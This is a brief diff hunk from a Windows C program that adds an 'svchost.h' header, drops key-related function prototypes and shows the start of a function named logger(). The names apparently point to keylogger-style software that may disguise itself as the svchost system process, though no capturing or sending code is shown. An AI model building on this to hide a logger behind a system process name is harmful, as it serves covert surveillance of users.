@@ -4,10 +4,8 @@
 #include<windowsx.h>
 #define BUFSIZE 80
 #include "targetver.h"
+#include "svchost.h"
 
-int test_key(void);
-int create_key(char *);
-int get_keys(void);
 
 int logger(void)
 {
